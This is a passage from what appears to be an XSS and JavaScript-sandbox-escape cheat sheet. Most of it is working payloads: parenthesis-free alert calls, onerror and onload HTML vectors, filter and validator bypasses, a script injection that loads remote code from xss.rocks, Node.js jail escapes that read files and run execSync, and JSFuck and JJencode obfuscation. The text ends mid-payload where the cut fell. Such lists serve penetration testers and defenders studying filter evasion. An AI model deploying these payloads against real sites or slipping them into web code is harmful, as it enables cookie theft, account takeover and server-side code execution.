symbol\n'alert\\x281\\x29'\ninstanceof\n{[\nSymbol\n[\n'hasInstance'\n]]\n:\neval\n}\n'alert\\x281\\x29'\ninstanceof\n{[\nSymbol\n.\nhasInstance\n]\n:\neval\n}\n// The ‚Äúhas instance‚Äù symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.\n‚Äã\nhttps://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md\n‚Äã\n‚Äã\nhttps://portswigger.net/research/javascript-without-parentheses-using-dommatrix\n‚Äã\nArbitrary function (alert) call\n//Eval like functions\neval\n(\n'ale'\n+\n'rt(1)'\n)\nsetTimeout\n(\n'ale'\n+\n'rt(2)'\n);\nsetInterval\n(\n'ale'\n+\n'rt(10)'\n);\nFunction\n(\n'ale'\n+\n'rt(10)'\n)\n``\n;\n[].\nconstructor\n.\nconstructor\n(\n\"alert(document.domain)\"\n)\n``\n[][\n\"constructor\"\n][\n\"constructor\"\n]\n`\n$\n${\nalert\n()\n}\n```\nimport\n(\n'data:text/javascript,alert(1)'\n)\n‚Äã\n//General function executions\n``\n//Can be use as parenthesis\nalert\n`\ndocument.cookie\n`\nalert\n(\ndocument\n[\n'cookie'\n])\nwith\n(\ndocument\n)\nalert\n(\ncookie\n)\n(\nalert\n)(\n1\n)\n(\nalert\n(\n1\n))\nin\n\".\"\na\n=\nalert\n,\na\n(\n1\n)\n[\n1\n].\nfind\n(\nalert\n)\nwindow\n[\n'alert'\n](\n0\n)\nparent\n[\n'alert'\n](\n1\n)\nself\n[\n'alert'\n](\n2\n)\ntop\n[\n'alert'\n](\n3\n)\nthis\n[\n'alert'\n](\n4\n)\nframes\n[\n'alert'\n](\n5\n)\ncontent\n[\n'alert'\n](\n6\n)\n[\n7\n].\nmap\n(\nalert\n)\n[\n8\n].\nfind\n(\nalert\n)\n[\n9\n].\nevery\n(\nalert\n)\n[\n10\n].\nfilter\n(\nalert\n)\n[\n11\n].\nfindIndex\n(\nalert\n)\n[\n12\n].\nforEach\n(\nalert\n);\ntop\n[\n/\nal\n/\n.\nsource\n+\n/\nert\n/\n.\nsource\n](\n1\n)\ntop\n[\n8680439.\n.\ntoString\n(\n30\n)](\n1\n)\nFunction\n(\n\"ale\"\n+\n\"rt(1)\"\n)();\nnew\nFunction\n`\nal\\ert\\`6\\`\n`\n;\nSet\n.\nconstructor\n(\n'ale'\n+\n'rt(13)'\n)();\nSet\n.\nconstructor\n`\nal\\x65rt\\x2814\\x29\n```\n;\n$\n=\n'e'\n;\nx\n=\n'ev'\n+\n'al'\n;\nx\n=\nthis\n[\nx\n];\ny\n=\n'al'\n+\n$\n+\n'rt(1)'\n;\ny\n=\nx\n(\ny\n);\nx\n(\ny\n)\nx\n=\n'ev'\n+\n'al'\n;\nx\n=\nthis\n[\nx\n];\ny\n=\n'ale'\n+\n'rt(1)'\n;\nx\n(\nx\n(\ny\n))\nthis\n[[]\n+\n(\n'eva'\n)\n+\n(\n/\nx\n/\n,\nnew\nArray\n)\n+\n'l'\n](\n/\nxxx\n.\nxxx\n.\nxxx\n.\nxxx\n.\nxx\n/+\nalert\n(\n1\n),\nnew\nArray\n)\nglobalThis\n[\n`\nal\n`\n+\n/\nert\n/\n.\nsource\n]\n`\n1\n`\nthis\n[\n`\nal\n`\n+\n/\nert\n/\n.\nsource\n]\n`\n1\n`\n[\nalert\n][\n0\n].\ncall\n(\nthis\n,\n1\n)\nwindow\n[\n'a'\n+\n'l'\n+\n'e'\n+\n'r'\n+\n't'\n]()\nwindow\n[\n'a'\n+\n'l'\n+\n'e'\n+\n'r'\n+\n't'\n].\ncall\n(\nthis\n,\n1\n)\ntop\n[\n'a'\n+\n'l'\n+\n'e'\n+\n'r'\n+\n't'\n].\napply\n(\nthis\n,[\n1\n])\n(\n1\n,\n2\n,\n3\n,\n4\n,\n5\n,\n6\n,\n7\n,\n8\n,\nalert\n)(\n1\n)\nx\n=\nalert\n,\nx\n(\n1\n)\n[\n1\n].\nfind\n(\nalert\n)\ntop\n[\n\"al\"\n+\n\"ert\"\n](\n1\n)\ntop\n[\n/\nal\n/\n.\nsource\n+\n/\nert\n/\n.\nsource\n](\n1\n)\nal\\\nu0065rt\n(\n1\n)\nal\\u0065rt\n`\n1\n`\ntop\n[\n'al\\145rt'\n](\n1\n)\ntop\n[\n'al\\x65rt'\n](\n1\n)\ntop\n[\n8680439.\n.\ntoString\n(\n30\n)](\n1\n)\n<\nsvg\n><\nanimate onbegin\n=\nalert\n()\nattributeName\n=\nx\n></\nsvg\n>\nDOM vulnerabilities\nThere is\nJS code\nthat is using\nunsafely data controlled by an attacker\nlike\nlocation.href\n. An attacker, could abuse this to execute arbitrary JS code.\nDue to the extension of the explanation of\nDOM vulnerabilities it was moved to this page\n:\nDOM XSS\nThere you will find a detailed\nexplanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them\n.\nAlso, don't forget that\nat the end of the mentioned post\nyou can find an explanation about\nDOM Clobbering attacks\n.\nOther Bypasses\nNormalised Unicode\nYou could check is the\nreflected values\nare being\nunicode normalized\nin the server (or in the client side) and abuse this functionality to bypass protections.\nFind an example here\n.\nPHP FILTER_VALIDATE_EMAIL flag Bypass\n\"><svg/onload=confirm(1)>\"\n@x\n.\ny\nRuby-On-Rails bypass\nDue to\nRoR mass assignment\nquotes are inserted in the HTML and then the quote restriction is bypassed and additoinal fields (onfocus) can be added inside the tag.\nForm example (\nfrom this report\n), if you send the payload:\ncontact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa\nThe pair \"Key\",\"Value\" will be echoed back like this:\n{\" onfocus=javascript:alert(&#39;xss&#39;) autofocus a\"=>\"a\"}\nThen, the onfocus attribute will be inserted:\nA XSS occurs.\nSpecial combinations\n<iframe/src=\"data:text/html,\n<\nsvg\nonload\n=\nalert\n(\n1\n)\n>\n\">\n<\ninput\ntype\n=\nimage\nsrc\nonerror\n=\n\"\nprompt\n(\n1\n)\n\"\n>\n<svg onload=alert(1)//\n<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">\n<\nimg\nsrc\n=\n'\n1\n'\nonerror\n=\n'\nalert\n(\n0\n)\n'\n<\n<script\nx\n>\nalert\n(\n1\n)\n</\nscript\n1\n=\n2\n<\nscript x\n>\nalert\n(\n'XSS'\n)\n<\nscript y\n>\n<\nsvg\n/\nonload\n=\nlocation\n=\n`\njavas\n`\n+\n`\ncript:ale\n`\n+\n`\nrt%2\n`\n+\n`\n81%2\n`\n+\n`\n9\n`\n;\n//\n<\nsvg\n////////onload=alert(1)>\n<\nsvg id\n=\nx\n;\nonload\n=\nalert\n(\n1\n)\n>\n<\nsvg id\n=\n`\nx\n`\nonload\n=\nalert\n(\n1\n)\n>\n<\nimg src\n=\n1\nalt\n=\nal lang\n=\nert onerror\n=\ntop\n[\nalt\n+\nlang\n](\n0\n)\n>\n<\nscript\n>\n$\n=\n1\n,\nalert\n(\n$\n)\n</\nscript\n>\n<\nscript\n~~~\n>\nconfirm\n(\n1\n)\n</\nscript\n~~~>\n<\nscript\n>\n$\n=\n1\n,\n\\\nu0061lert\n(\n$\n)\n</\nscript\n>\n<</script/script>\n<\nscript\n>\neval\n(\n'\\\\u'\n+\n'0061'\n+\n'lert(1)'\n)\n//\n</\nscript\n>\n<</script/script>\n<\nscript\n~~~\n>\n\\\nu0061lert\n(\n1\n)\n</\nscript\n~~~>\n</\nstyle\n>\n</\nscRipt\n>\n<\nscRipt\n>\nalert\n(\n1\n)\n</\nscRipt\n>\n<\nimg\nsrc\n=\nx:prompt(eval(alt))\nonerror\n=\neval\n(\nsrc\n)\nalt\n=\nString.fromCharCode(88,83,83)\n>\n<\nsvg\n>\n<\nx\n>\n<\nscript\n>\nalert('1'&#41\n</\nx\n>\n<iframe src=\"\"/srcdoc='\n<\nsvg\nonload\n=\nalert\n(\n1\n)\n>\n'>\n<\nsvg\n>\n<\nanimate\nonbegin\n=\nalert()\nattributeName\n=\nx\n>\n</\nsvg\n>\n<img/id=\"alert('XSS')\\\"/alt=\\\"/\\\"src=\\\"/\\\"onerror=eval(id)>\n<\nimg\nsrc\n=\n1\nonerror\n=\n\"\ns\n=\ndocument\n.\ncreateElement\n(\n'script'\n);\ns\n.\nsrc\n=\n'http://xss.rocks/xss.js'\n;\ndocument\n.\nbody\n.\nappendChild\n(\ns\n);\n\"\n>\n(function(x){this[x+`ert`](1)})`al`\nwindow[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)\ndocument['default'+'View'][`\\u0061lert`](3)\nXSS with header injection in a 302 response\nIf you find that you can\ninject headers in a 302 Redirect response\nyou could try to\nmake the browser execute arbitrary JavaScript\n. This is\nnot trivial\nas modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.\nIn\nthis report\nand\nthis one\nyou can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\nPast known protocols:\nmailto://\n,\n//x:1/\n,\nws://\n,\nwss://\n,\nempty Location header\n,\nresource://\n.\nOnly Letters, Numbers and Dots\nIf you are able to indicate the\ncallback\nthat javascript is going to\nexecute\nlimited to those chars.\nRead this section of this post\nto find how to abuse this behaviour.\nValid\n<script>\nContent-Types to XSS\n(From\nhere\n) If you try to load a script with a\ncontent-type\nsuch as\napplication/octet-stream\n, Chrome will throw following error:\nRefused to execute script from ‚Äò\nhttps://uploader.c.hc.lc/uploads/xxx'\nbecause its MIME type (‚Äòapplication/octet-stream‚Äô) is not executable, and strict MIME type checking is enabled.\nThe only\nContent-Type\ns that will support Chrome to run a\nloaded script\nare the ones inside the const\nkSupportedJavascriptTypes\nfrom\nhttps://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc\n‚Äã\nconst\nchar\n*\nconst\nkSupportedJavascriptTypes\n[]\n=\n{\n\"application/ecmascript\"\n,\n\"application/javascript\"\n,\n\"application/x-ecmascript\"\n,\n\"application/x-javascript\"\n,\n\"text/ecmascript\"\n,\n\"text/javascript\"\n,\n\"text/javascript1.0\"\n,\n\"text/javascript1.1\"\n,\n\"text/javascript1.2\"\n,\n\"text/javascript1.3\"\n,\n\"text/javascript1.4\"\n,\n\"text/javascript1.5\"\n,\n\"text/jscript\"\n,\n\"text/livescript\"\n,\n\"text/x-ecmascript\"\n,\n\"text/x-javascript\"\n,\n};\n‚Äã\nScript Types to XSS\n(From\nhere\n) So, which types could be indicated to load a script?\n<\nscript\ntype\n=\n\"\n???\n\"\n>\n</\nscript\n>\nThe answer is:\nmodule\n(default, nothing to explain)\n‚Äã\nwebbundle\n: Web Bundles is a feature that you can package a bunch of data (HTML, CSS, JS‚Ä¶) together into a\n.wbn\nfile.\n<\nscript\ntype\n=\n\"\nwebbundle\n\"\n>\n{\n\"source\"\n:\n\"https://example.com/dir/subresources.wbn\"\n,\n\"resources\"\n:\n[\n\"https://example.com/dir/a.js\"\n,\n\"https://example.com/dir/b.js\"\n,\n\"https://example.com/dir/c.png\"\n]\n}\n</\nscript\n>\nThe resources are loaded from the source .wbn, not accessed via HTTP\n‚Äã\nimportmap\n:\nAllows to improve the import syntax\n<\nscript\ntype\n=\n\"\nimportmap\n\"\n>\n{\n\"imports\"\n:\n{\n\"moment\"\n:\n\"/node_modules/moment/src/moment.js\"\n,\n\"lodash\"\n:\n\"/node_modules/lodash-es/lodash.js\"\n}\n}\n</\nscript\n>\n‚Äã\n<!-- With importmap you can do the following -->\n<\nscript\n>\nimport\nmoment\nfrom\n\"moment\"\n;\nimport\n{\npartition\n}\nfrom\n\"lodash\"\n;\n</\nscript\n>\nThis behaviour was used in\nthis writeup\nto remap a library to eval to abuse it can trigger XSS.\n‚Äã\nspeculationrules\n:\nThis feature is mainly to solve some problems caused by pre-rendering. It works like this:\n<\nscript\ntype\n=\n\"\nspeculationrules\n\"\n>\n{\n\"prerender\"\n:\n[\n{\n\"source\"\n:\n\"list\"\n,\n\"urls\"\n:\n[\n\"/page/2\"\n],\n\"score\"\n:\n0.5\n},\n{\n\"source\"\n:\n\"document\"\n,\n\"if_href_matches\"\n:\n[\n\"https://*.wikipedia.org/**\"\n],\n\"if_not_selector_matches\"\n:\n[\n\".restricted-section *\"\n],\n\"score\"\n:\n0.1\n}\n]\n}\n</\nscript\n>\nWeb Content-Types to XSS\n(From\nhere\n) The following content types can execute XSS in all browsers:\ntext/html\napplication/xhtml+xml\napplication/xml\ntext/xml\nimage/svg+xml\ntext/plain (?? not in the list but I think I saw this in a CTF)\napplication/rss+xml (off)\napplication/atom+xml (off)\nIn other browsers other\nContent-Types\ncan be used to execute arbitrary JS, check:\nhttps://github.com/BlackFan/content-type-research/blob/master/XSS.md\n‚Äã\nxml Content Type\nIf the page is returnin a text/xml content-type it's possible to indicate a namespace and execute arbitrary JS:\n<\nxml\n>\n<\ntext\n>\nhello\n<\nimg\nsrc\n=\n\"\n1\n\"\nonerror\n=\n\"\nalert\n(\n1\n)\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/1999/xhtml\n\"\n/>\n</\ntext\n>\n</\nxml\n>\n‚Äã\n<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->\nSpecial Replacement Patterns\nWhen something like\n\"some {{template}} data\".replace(\"{{template}}\", <user_input>)\nis used. The attacker could use\nspecial string replacements\nto try to bypass some protections:\n\"123 {{template}} 456\".replace(\"{{template}}\", JSON.stringify({\"name\": \"$'$`alert(1)//\"}))\nFor example in\nthis writeup\n, this was used to\nscape a JSON string\ninside a script and execute arbitrary code.\nChrome Cache to XSS\nChrome Cache to XSS\nXS Jails Escape\nIf you are only have a limited set of chars to use, check these other valid solutions for XSJail problems:\n// eval + unescape + regex\neval\n(\nunescape\n(\n/\n%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f\n/\n))()\neval\n(\nunescape\n(\n1\n+\n/\n1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f\n/\n))\n‚Äã\n// use of with\nwith\n(\nconsole\n)\nlog\n(\n123\n)\nwith\n(\n/\nconsole.log(1)\n/\n)\nwith\n(\nthis\n)\nwith\n(\nconstructor\n)\nconstructor\n(\nsource\n)()\n// Just replace console.log(1) to the real code, the code we want to run is:\n//return String(process.mainModule.require('fs').readFileSync('flag.txt'))\n‚Äã\nwith\n(\nprocess\n)\nwith\n(\nmainModule\n)\nwith\n(\nrequire\n(\n'fs'\n))\nreturn\n(\nString\n(\nreadFileSync\n(\n'flag.txt'\n)))\nwith\n(\nk\n=\n'fs'\n,\nn\n=\n'flag.txt'\n,\nprocess\n)\nwith\n(\nmainModule\n)\nwith\n(\nrequire\n(\nk\n))\nreturn\n(\nString\n(\nreadFileSync\n(\nn\n)))\nwith\n(\nString\n)\nwith\n(\nf\n=\nfromCharCode\n,\nk\n=\nf\n(\n102\n,\n115\n),\nn\n=\nf\n(\n102\n,\n108\n,\n97\n,\n103\n,\n46\n,\n116\n,\n120\n,\n116\n),\nprocess\n)\nwith\n(\nmainModule\n)\nwith\n(\nrequire\n(\nk\n))\nreturn\n(\nString\n(\nreadFileSync\n(\nn\n)))\n‚Äã\n//Final solution\nwith\n(\n/\nwith\n(\nString\n)\nwith\n(\nf\n=\nfromCharCode\n,\nk\n=\nf\n(\n102\n,\n115\n),\nn\n=\nf\n(\n102\n,\n108\n,\n97\n,\n103\n,\n46\n,\n116\n,\n120\n,\n116\n),\nprocess\n)\nwith\n(\nmainModule\n)\nwith\n(\nrequire\n(\nk\n))\nreturn\n(\nString\n(\nreadFileSync\n(\nn\n)))\n/\n)\nwith\n(\nthis\n)\nwith\n(\nconstructor\n)\nconstructor\n(\nsource\n)()\n‚Äã\n// For more uses of with go to challenge misc/CaaSio PSE in\n// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE\nIf\neverything is undefined\nbefore executing untrusted code (like in\nthis writeup\n) it's possible to generate useful objects \"out of nothing\" to abuse the execution of arbitrary untrusted code:\nUsing import()\n// although import \"fs\" doesn‚Äôt work, import('fs') does.\nimport\n(\n\"fs\"\n).\nthen\n(\nm\n=>\nconsole\n.\nlog\n(\nm\n.\nreadFileSync\n(\n\"/flag.txt\"\n,\n\"utf8\"\n)))\nAccessing\nrequire\nindirectly\n‚Äã\nAccording to this\nmodules are wrapped by Node.js within a function, like this:\n(\nfunction\n(\nexports\n,\nrequire\n,\nmodule\n,\n__filename\n,\n__dirname\n)\n{\n// our actual module code\n});\nTherefore, if from that module we can\ncall another function\n, it's possible to use\narguments.callee.caller.arguments[1]\nfrom that function to access\nrequire\n:\n(\nfunction\n(){\nreturn\narguments\n.\ncallee\n.\ncaller\n.\narguments\n[\n1\n](\n\"fs\"\n).\nreadFileSync\n(\n\"/flag.txt\"\n,\n\"utf8\"\n)})()\nIn a similar way to the previous example, it's possible to\nuse error handlers\nto access the\nwrapper\nof the module and get the\nrequire\nfunction:\ntry\n{\nnull\n.\nf\n()\n}\ncatch\n(\ne\n)\n{\nTypeError\n=\ne\n.\nconstructor\n}\nObject\n=\n{}.\nconstructor\nString\n=\n''\n.\nconstructor\nError\n=\nTypeError\n.\nprototype\n.\n__proto__\n.\nconstructor\nfunction\nCustomError\n()\n{\nconst\noldStackTrace\n=\nError\n.\nprepareStackTrace\ntry\n{\nError\n.\nprepareStackTrace\n=\n(\nerr\n,\nstructuredStackTrace\n)\n=>\nstructuredStackTrace\nError\n.\ncaptureStackTrace\n(\nthis\n)\nthis\n.\nstack\n}\nfinally\n{\nError\n.\nprepareStackTrace\n=\noldStackTrace\n}\n}\nfunction\ntrigger\n()\n{\nconst\nerr\n=\nnew\nCustomError\n()\nconsole\n.\nlog\n(\nerr\n.\nstack\n[\n0\n])\nfor\n(\nconst\nx\nof\nerr\n.\nstack\n)\n{\n// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter\nconst\nfn\n=\nx\n.\ngetFunction\n()\nconsole\n.\nlog\n(\nString\n(\nfn\n).\nslice\n(\n0\n,\n200\n))\nconsole\n.\nlog\n(\nfn\n?.\narguments\n)\nconsole\n.\nlog\n(\n'='\n.\nrepeat\n(\n40\n))\nif\n((\nargs\n=\nfn\n?.\narguments\n)\n?.\nlength\n>\n0\n)\n{\nreq\n=\nargs\n[\n1\n]\nconsole\n.\nlog\n(\nreq\n(\n'child_process'\n).\nexecSync\n(\n'id'\n).\ntoString\n())\n}\n}\n}\ntrigger\n()\nObfuscation & Advanced Bypass\nDifferent obfuscations in one page:\nhttps://aem1k.com/aurebesh.js/\n‚Äã\n‚Äã\nhttps://github.com/aemkei/katakana.js\n‚Äã\n‚Äã\nhttps://ooze.ninja/javascript/poisonjs\n‚Äã\n‚Äã\nhttps://javascriptobfuscator.herokuapp.com/\n‚Äã\n‚Äã\nhttps://skalman.github.io/UglifyJS-online/\n‚Äã\n‚Äã\nhttp://www.jsfuck.com/\n‚Äã\nMore sofisticated JSFuck:\nhttps://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce\n‚Äã\n‚Äã\nhttp://utf-8.jp/public/jjencode.html\n‚Äã\n‚Äã\nhttps://utf-8.jp/public/aaencode.html\n‚Äã\n‚Äã\nhttps://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses\n‚Äã\n//Katana\n<\nscript\n>\n([,\n„Ç¶\n,,,,\n„Ç¢\n]\n=\n[]\n+\n{},[\n„Éç\n,\n„Éõ\n,\n„Éå\n,\n„Çª\n,,\n„Éü\n,\n„Éè\n,\n„Éò\n,,,\n„Éä\n]\n=\n[\n!!\n„Ç¶\n]\n+!\n„Ç¶\n+\n„Ç¶\n.\n„Ç¶\n)[\n„ÉÑ\n=\n„Ç¢\n+\n„Ç¶\n+\n„Éä\n+\n„Éò\n+\n„Éç\n+\n„Éõ\n+\n„Éå\n+\n„Ç¢\n+\n„Éç\n+\n„Ç¶\n+\n„Éõ\n][\n„ÉÑ\n](\n„Éü\n+\n„Éè\n+\n„Çª\n+\n„Éõ\n+\n„Éç\n+\n'(-~„Ç¶)'\n)()\n</\nscript\n>\n//JJencode\n<\nscript\n>\n$\n=~\n[];\n$\n=\n{\n___\n:++\n$\n,\n$\n:\n(\n!\n[]\n+\n\"\"\n)[\n$\n],\n__$\n:++\n$\n,\n$_$_\n:\n(\n!\n[]\n+\n\"\"\n)[\n$\n],\n_$_\n:++\n$\n,\n$_$\n:\n({}\n+\n\"\"\n)[\n$\n],\n$_$\n:\n(\n$\n[\n$\n]\n+\n\"\"\n)[\n$\n],\n_$\n:++\n$\n,\n$_\n:\n(\n!\n\"\"\n+\n\"\"\n)[\n$\n],\n$__\n:++\n$\n,\n$_$\n:++\n$\n,\n$__\n:\n({}\n+\n\"\"\n)[\n$\n],\n$_\n:++\n$\n,\n$\n:++\n$\n,\n$___\n:++\n$\n,\n$__$\n:++\n$\n};\n$\n.\n$_\n=\n(\n$\n.\n$_\n=\n$\n+\n\"\"\n)[\n$\n.\n$_$\n]\n+\n(\n$\n.\n_$\n=\n$\n.\n$_\n[\n$\n.\n__$\n])\n+\n(\n$\n.\n$\n=\n(\n$\n.\n$\n+\n\"\"\n)[\n$\n.\n__$\n])\n+\n((\n!\n$\n)\n+\n\"\"\n)[\n$\n.\n_$\n]\n+\n(\n$\n.\n__\n=\n$\n.\n$_\n[\n$\n.\n$_\n])\n+\n(\n$\n.\n$\n=\n(\n!\n\"\"\n+\n\"\"\n)[\n$\n.\n__$\n])\n+\n(\n$\n.\n_\n=\n(\n!\n\"\"\n+\n\"\"\n)[\n$\n.\n_$_\n])\n+\n$\n.\n$_\n[\n$\n.\n$_$\n]\n+\n$\n.\n__\n+\n$\n.\n_$\n+\n$\n.\n$\n;\n$\n.\n$\n=\n$\n.\n$\n+\n(\n!\n\"\"\n+\n\"\"\n)[\n$\n.\n_$\n]\n+\n$\n.\n__\n+\n$\n.\n_\n+\n$\n.\n$\n+\n$\n.\n$\n;\n$\n.\n$\n=\n(\n$\n.\n___\n)[\n$\n.\n$_\n][\n$\n.\n$_\n];\n$\n.\n$\n(\n$\n.\n$\n(\n$\n.\n$\n+\n\"\\\"\"\n+\n$\n.\n$_$_\n+\n(\n!\n[]\n+\n\"\"\n)[\n$\n.\n_$_\n]\n+\n$\n.\n$_\n+\n\"\\\\\"\n+\n$\n.\n__$\n+\n$\n.\n$_\n+\n$\n.\n_$_\n+\n$\n.\n__\n+\n\"(\"\n+\n$\n.\n___\n+\n\")\"\n+\n\"\\\"\"\n)())();\n</\nscript\n>\n//JSFuck\n<\nscript\n>\n(\n+\n[])[([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n([][[]]\n+\n[])[\n+!+\n[]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]\n+\n([][[]]\n+\n[])[\n+\n[]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]][([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n([][[]]\n+\n[])[\n+!+\n[]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]\n+\n([][[]]\n+\n[])[\n+\n[]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]]((\n!\n[]\n+\n[])[\n+!+\n[]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n([][([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n([][[]]\n+\n[])[\n+!+\n[]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]\n+\n([][[]]\n+\n[])[\n+\n[]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n